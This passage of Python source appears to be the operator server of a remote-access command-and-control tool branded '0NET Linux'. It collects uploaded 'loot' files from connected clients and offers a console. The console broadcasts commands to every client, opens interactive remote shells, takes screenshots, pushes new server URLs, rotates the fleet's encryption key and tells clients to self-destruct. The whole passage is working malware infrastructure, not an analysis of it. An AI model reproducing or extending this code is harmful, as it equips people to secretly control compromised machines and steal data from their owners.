                    for i in range(total):
                        with open(os.path.join(d, f"{i}.part"), "rb") as r:
                            shutil.copyfileobj(r, w)
                shutil.rmtree(d, ignore_errors=True)
                print()
                print(" " + tag("LOOT", C.BGRN) + " " + C.B + cid + C.R + " "
                      + C.D + "·" + C.R + " " + C.BWHT + os.path.basename(out) + C.R
                      + C.D + " (" + str(os.path.getsize(out)) + " bytes)" + C.R)
                print()
            self._send(200, b"OK", self._enroll_headers())
        except Exception as e:
            say("x", C.RED, f"POST /upload: {e}")
            self._send(500)

def _sweep_uploads():
    global _upload_sweep
    now = time.time()
    if now - _upload_sweep < 60.0:
        return
    _upload_sweep = now
    try:
        for n in os.listdir(UPLOAD_DIR):
            p = os.path.join(UPLOAD_DIR, n)
            try:
                if os.path.isdir(p) and now - os.path.getmtime(p) > UPLOAD_STALE_SEC:
                    shutil.rmtree(p, ignore_errors=True)
            except Exception:
                pass
    except Exception:
        pass

# --- results ---

def _fire(did, cmd_id):
    with pending_lock:
        ev = pending_events.get(did, {}).get(cmd_id)
    if ev:
        ev.set()

def add_command_result(target_id, command, output, cmd_id):
    body = clean(output.rstrip("\n")) or "(no output)"
    lines = body.split("\n")
    cut = len(lines) > MAX_PRINT_LINES or len(body) > MAX_PRINT_CHARS
    if len(lines) > MAX_PRINT_LINES:
        lines = lines[:MAX_PRINT_LINES]
    if len(body) > MAX_PRINT_CHARS:
        lines = body[:MAX_PRINT_CHARS].split("\n")
    if cut:
        lines.append("… truncated")

    with _PRINT:
        print()
        print(" " + tag("RESULT", C.BGRN) + " " + C.B + target_id + C.R + " "
              + C.D + "·" + C.R + " " + C.B + clean(command) + C.R
              + " " + C.D + datetime.now().strftime("%H:%M:%S") + C.R)
        print(" " + C.D + "─" * (width() - 2) + C.R)
        for ln in lines:
            print("  " + ln)
        print(" " + C.D + "─" * (width() - 2) + C.R)
        print()
        sys.stdout.flush()

    try:
        d = os.path.join(REPORT_DIR, target_id)
        os.makedirs(d, exist_ok=True)
        p = os.path.join(d, datetime.now().strftime("%Y-%m-%d") + ".txt")
        try:
            if os.path.getsize(p) > MAX_LOG_BYTES:
                os.replace(p, p + ".1")
        except Exception:
            pass
        with open(p, "a", encoding="utf-8") as f:
            f.write(f"[{datetime.now().isoformat(timespec='seconds')}] {cmd_id} $ {command}\n{output}\n\n")
    except Exception:
        pass
    _fire(target_id, cmd_id)

# --- console ---

def run_shell(target_id):
    print()
    print(" " + tag("SHELL", C.BMAG) + " " + C.B + target_id + C.R)
    print(" " + C.D + "raw sh commands · 'shell <ID>' switches target · 'exit' or Ctrl-C leaves" + C.R)
    print()
    with pending_lock:
        pending_events[target_id] = {}

    while True:
        try:
            with _PRINT:
                sys.stdout.write("  " + C.D + "shell " + C.MAG + target_id + C.R + C.D + " > " + C.R)
                sys.stdout.flush()
            line = input().strip()
        except (KeyboardInterrupt, EOFError):
            print()
            _leave_shell(target_id)
            return

        if line in ("exit", "quit", "quit()", "..", ":q", "bye", "logout"):
            _leave_shell(target_id)
            return
        if not line:
            continue

        sw = re.match(r'^shell\s+([A-Fa-f0-9:.]{2,45})$', line)
        if sw:
            newt = norm_target(sw.group(1))
            with clients_lock:
                ok = newt in clients
            if ok:
                enqueue(target_id, "shellquit")
                target_id = newt
                with pending_lock:
                    pending_events.setdefault(target_id, {})
                say("+", C.GRN, f"switched to {C.B}{target_id}{C.R}")
            else:
                say("!", C.YEL, f"client {newt} not connected")
            continue

        cid = new_id()
        ev = threading.Event()
        with pending_lock:
            pending_events.setdefault(target_id, {})[cid] = ev
        enqueue(target_id, f"shellcmd {line}", cid)
        try:
            if not ev.wait(timeout=SHELL_TIMEOUT):
                say("!", C.YEL, f"no response after {int(SHELL_TIMEOUT)}s")
        except KeyboardInterrupt:
            print()
            with pending_lock:
                pending_events.get(target_id, {}).pop(cid, None)
            _leave_shell(target_id)
            return
        with pending_lock:
            pending_events.get(target_id, {}).pop(cid, None)

def _leave_shell(target_id):
    enqueue(target_id, "shellquit")
    say("·", C.D, f"shell on {target_id} closed")
    with pending_lock:
        pending_events.pop(target_id, None)

def print_help():
    print()
    print(p_top("commands"))
    print(p_line())
    for a, b in (("show", "list connected clients"),
                 ("info", "pull full system info from everyone"),
                 ("<ID|IP> <cmd>", "run a command on one client"),
                 ("<cmd>", "broadcast a command to everyone"),
                 ("\\<cmd>", "force broadcast even if reserved"),
                 ("shell <ID>", "interactive shell on one client"),
                 ("shot [ID]", "screenshot a client -> loot/"),
                 ("sleep <sec> [ID]", "change poll interval"),
                 ("remove <ID|IP>", "block + self-destruct"),
                 ("unblock <ID|IP>", "lift a block"),
                 ("revoke <ID>", "drop secret, force re-enroll"),
                 ("setkey <key>", "rotate the fleet key"),
                 ("updateserver <url>", "push a new server URL"),
                 ("config", "show configuration"),
                 ("log <ID> [n]", "tail a client's result history"),
                 ("loot", "list received files"),
                 ("clear", "clear the screen")):
        print(p_line(C.BCYN + a.ljust(22) + C.R + "  " + C.WHT + b + C.R))
    print(p_line())
    print(p_bot())
    print()

def print_show():
    remove_stale_ips()
    with clients_lock:
        items = sorted(clients.items(), key=lambda kv: kv[1]["ts"], reverse=True)
    with enrolled_lock:
        enrolled_ids = set(enrolled.keys())
    with block_lock:
        bi, bp = sorted(blocked_ids), sorted(blocked_ips)

    print()
    print(p_top("clients - " + str(len(items))))
    print(p_line())
    if not items:
        print(p_line(C.D + "(no clients online)" + C.R))
    for did, v in items:
        star = C.GRN + "*" + C.R if did in enrolled_ids else C.D + "·" + C.R
        print(p_line(C.BGRN + "●" + C.R + "  " + star + " " + C.B + C.BWHT + did + C.R + "   "
                     + C.D + ago(v["ts"]) + C.R))
        print(p_line("   " + C.D + v["ip"] + C.R + "  " + C.D + "·" + C.R + "  " + C.WHT + v["os"] + C.R))
    if bi or bp:
        print(p_line())
        print(p_div("blocked"))
        if bi:
            print(p_line(C.BRED + "ids" + C.R + "  " + C.D + ", ".join(bi) + C.R))
        if bp:
            print(p_line(C.BRED + "ips" + C.R + "  " + C.D + ", ".join(bp) + C.R))
    print(p_line())
    print(p_bot())
    print()

def print_config():
    with enrolled_lock:
        n = len(enrolled)
    rows = (
        ("bind", f"{SERVER_BIND_ADDRESS}:{SERVER_PORT}"),
        ("key", "*" * len(SERVER_ENCRYPTION_KEY_STR) + f"  ({len(SERVER_ENCRYPTION_KEY_STR)} chars)"),
    )
    print()
    print(p_top("configuration"))
    print(p_line())
    for a, b in rows:
        print(p_line(C.D + a.ljust(18) + C.R + C.WHT + b + C.R))
    if OLD_ENCRYPTION_KEY_STR:
        print(p_line(C.D + "old key".ljust(18) + C.R + C.WHT + "*" * len(OLD_ENCRYPTION_KEY_STR) + C.R
                     + C.BYEL + "  (rotation active)" + C.R))
    for a, b in (("cipher", "AES-128-CBC · IV · HKDF-SHA256"),
                 ("auth", "HMAC token · single-use nonce"),
                 ("nonce ttl", str(int(NONCE_TTL // 86400)) + "d"),
                 ("timestamp", "advisory"),
                 ("identity", f"per-client secret ({n} enrolled)"),
                 ("resync", "address-pinned"),
                 ("proxy", "trusted + validated" if TRUST_PROXY_HEADERS else "ignored")):
        print(p_line(C.D + a.ljust(18) + C.R + C.WHT + b + C.R))
    print(p_line())
    print(p_bot())
    print()

def print_loot():
    files = sorted(os.listdir(LOOT_DIR))
    print()
    print(p_top("loot - " + str(len(files))))
    print(p_line())
    if not files:
        print(p_line(C.D + "(empty)" + C.R))
    for f in files[-40:]:
        try:
            sz = os.path.getsize(os.path.join(LOOT_DIR, f))
        except Exception:
            sz = 0
        print(p_line(C.WHT + str(sz).rjust(10) + C.R + "  " + C.CYN + f + C.R))
    print(p_line())
    print(p_bot())
    print()

def print_log(target, n):
    d = os.path.join(REPORT_DIR, target)
    logs = sorted(os.listdir(d)) if os.path.isdir(d) else []
    if not logs:
        say("!", C.YEL, f"no history for {target}")
        return
    print()
    print(p_top("history · " + target))
    print(p_line())
    with open(os.path.join(d, logs[-1]), "r", encoding="utf-8", errors="replace") as f:
        for ln in f.read().splitlines()[-n:]:
            print(p_line(C.D + clean(ln) + C.R))
    print(p_line())
    print(p_bot())
    print()

def console_thread():
    global SERVER_ENCRYPTION_KEY_STR, OLD_ENCRYPTION_KEY_STR

    while True:
        try:
            with _PRINT:
                sys.stdout.write(C.BCYN + "> " + C.R)
                sys.stdout.flush()
            line = input().strip()
            if not line:
                continue
            low = line.lower()

            if low == "help":
                print_help()
            elif low == "show":
                print_show()
            elif low == "clear":
                sys.stdout.write("\033[2J\033[H")
                print_banner()
            elif low == "loot":
                print_loot()
            elif low == "config":
                print_config()
            elif low.startswith("setkey "):
                new_key = line[7:].strip()
                if not new_key:
                    say("x", C.RED, "key cannot be empty")
                    continue
                OLD_ENCRYPTION_KEY_STR = SERVER_ENCRYPTION_KEY_STR
                SERVER_ENCRYPTION_KEY_STR = new_key
                save_state(force=True)
                cid = new_id()
                wire = f"updatekey {new_key} (ID-{cid})"
                enc = aes_encrypt(wire, OLD_ENCRYPTION_KEY_STR)
                set_broadcast(wire, enc, mac_hex(enc, OLD_ENCRYPTION_KEY_STR), ttl=KEY_GRACE_SEC)
                enqueue_all(f"updatekey {new_key}", cid)
                say("+", C.GRN, f"key rotated · old key valid {int(KEY_GRACE_SEC)}s")

                def _retire():
                    global OLD_ENCRYPTION_KEY_STR
                    time.sleep(KEY_GRACE_SEC)
                    OLD_ENCRYPTION_KEY_STR = ""
                    save_state(force=True)
                    say("·", C.D, "old key retired")
                threading.Thread(target=_retire, daemon=True).start()
            elif low.startswith("updateserver "):
                url = line[13:].strip()
                if url:
                    set_broadcast(f"updateserver {url}", ttl=PENDING_TTL)
                    enqueue_all(f"updateserver {url}")
                    say("+", C.GRN, f"clients told to use {C.B}{url}{C.R}")
            elif low == "info":
                set_broadcast("info", ttl=PENDING_TTL)
                enqueue_all("info")
                with clients_lock:
                    n = len(clients)
                say("+", C.GRN, f"info requested · {n} client(s)")
            elif low.startswith("log "):
                parts = line.split()
                if len(parts) < 2:
                    say("!", C.YEL, "usage: log <ID> [lines]")
                    continue
                print_log(norm_target(parts[1]),
                          max(1, min(int(parts[2]), 500)) if len(parts) > 2 and parts[2].isdigit() else 40)
            elif low.startswith("unblock "):
                t = norm_target(line[8:].strip())
                with block_lock:
                    hit = t in blocked_ips or t in blocked_ids
                    blocked_ips.discard(t)
                    blocked_ids.discard(t)
                save_state(force=True)
                say("+" if hit else "!", C.GRN if hit else C.YEL,
                    f"{t} unblocked" if hit else f"{t} was not blocked")
            elif low.startswith("revoke "):
                t = norm_target(line[7:].strip())
                with enrolled_lock:
                    hit = enrolled.pop(t, None)
                    enrolled_ip.pop(t, None)
                save_state(force=True)
                if hit:
                    enqueue(t, "forget")
                    say("+", C.GRN, f"{t} secret revoked · told it to re-enroll")
                else:
                    say("!", C.YEL, f"{t} not enrolled")
            elif low.startswith("remove "):
                t = norm_target(line[7:].strip())
                removed = block_client(t)
                save_state(force=True)
                if removed:
                    for ip, did in removed:
                        enqueue(did, "remove")
                        say("+", C.GRN, f"{did} removed and blocked · {C.D}{ip}{C.R}")
                else:
                    say("!", C.YEL, f"no active client with ID or IP: {t}")
            elif low.startswith("shot"):
                tgt = norm_target(line.partition(" ")[2].strip()) if " " in line else "*"
                tid = new_id()
                enqueue(tgt, f"screenshot {tid}")
                say("+", C.GRN, f"screenshot requested · {tgt} · {C.D}{tid}{C.R}")
            elif low.startswith("sleep "):
                parts = line[6:].split()
                if not parts or not parts[0].isdigit():
                    say("!", C.YEL, "usage: sleep <seconds> [ID]")
                    continue
                tgt = norm_target(parts[1]) if len(parts) > 1 else "*"
                poll_hint[tgt] = int(parts[0])
                enqueue(tgt, f"sleep {parts[0]}")
                say("+", C.GRN, f"{tgt} poll interval -> {parts[0]}s")
            elif low.startswith("shell "):
                parts = line.split()
                if len(parts) < 2:
                    say("!", C.YEL, "usage: shell <deviceID>")
                    continue
                target_id = norm_target(parts[1])
                with clients_lock:
                    if target_id not in clients:
                        say("!", C.YEL, f"client {target_id} not connected")
                        continue
                run_shell(target_id)
            elif line.startswith("\\"):
                cmd = line[1:].strip()
                if cmd:
                    set_broadcast(cmd, ttl=PENDING_TTL)
                    enqueue_all(cmd)
                    with clients_lock:
                        n = len(clients)
                    say("+", C.GRN, f"broadcast {C.B}{clean(cmd)}{C.R} · {n} client(s)")
            elif re.match(r'^(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}|[0-9A-Fa-f:]{2,45}|[A-Fa-f0-9]{6})\s', line):
                parts = line.split(maxsplit=1)
                enqueue(norm_target(parts[0]), parts[1])
                say("+", C.GRN, f"{norm_target(parts[0])} ← {C.B}{clean(parts[1])}{C.R}")
            else:
                cmd = line.strip()
                set_broadcast(cmd, ttl=PENDING_TTL)
                enqueue_all(cmd)
                with clients_lock:
                    n = len(clients)
                say("+", C.GRN, f"broadcast {C.B}{clean(cmd)}{C.R} · {n} client(s)")
        except KeyboardInterrupt:
            print()
        except EOFError:
            print()
            break
        except Exception as e:
            say("x", C.RED, f"console: {e}")

# --- main ---

class Server6(socketserver.ThreadingTCPServer):
    allow_reuse_address = True
    daemon_threads = True
    request_queue_size = 128
    address_family = socket.AF_INET6

    def server_bind(self):
        try:
            self.socket.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_V6ONLY, 0)
        except Exception:
            pass
        socketserver.ThreadingTCPServer.server_bind(self)

class Server4(socketserver.ThreadingTCPServer):
    allow_reuse_address = True
    daemon_threads = True
    request_queue_size = 128
    address_family = socket.AF_INET

_sem = threading.BoundedSemaphore(MAX_CONN)

class Handler(RequestHandler):
    def setup(self):
        _sem.acquire()
        try:
            super().setup()
        except Exception:
            _sem.release()
            raise

    def finish(self):
        try:
            super().finish()
        finally:
            _sem.release()

def print_banner():
    print()
    print(p_top())
    print(p_blank())
    print(p_mid("0NET Linux", C.B + C.BWHT + "0NET" + C.R + " " + C.WHT + "Linux" + C.R))
    print(p_mid("", C.D))
    print(p_blank())
    print(p_bot())
    print()

def make_server():
    
    addr = SERVER_BIND_ADDRESS.strip()
    if addr in ("", "*", "0.0.0.0", "::"):
        try:
            srv = Server6(("::", SERVER_PORT), Handler)
            say("·", C.D, "bound dual-stack [::] + 0.0.0.0")
            return srv
        except OSError as e:
            say("!", C.YEL, f"dual-stack bind failed ({e}) - ipv4 only")
        return Server4(("0.0.0.0", SERVER_PORT), Handler)
    if ":" in addr:
        return Server6((addr, SERVER_PORT), Handler)
    return Server4((addr, SERVER_PORT), Handler)

def main():
    _save_tty()
    load_state()
    print_banner()
    print("  " + C.D + "key" + C.R + "        " + C.WHT + "*" * len(SERVER_ENCRYPTION_KEY_STR) + C.R)
    print("  " + C.D + "listening" + C.R + "  " + C.WHT + f"http://{SERVER_BIND_ADDRESS}:{SERVER_PORT}" + C.R)
    print("  " + C.D + "type" + C.R + " " + C.BCYN + "help" + C.R + " " + C.D + "for commands" + C.R)
    print()

    threading.Thread(target=console_thread, daemon=True).start()

    httpd = make_server()
    try:
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print(f"\n  {C.YEL}shutting down{C.R}")
    finally:
        _write_state()
        restore_tty()
        try:
            sys.stdout.flush()
        except Exception:
            pass
    os._exit(0)

if __name__ == "__main__":
    main()
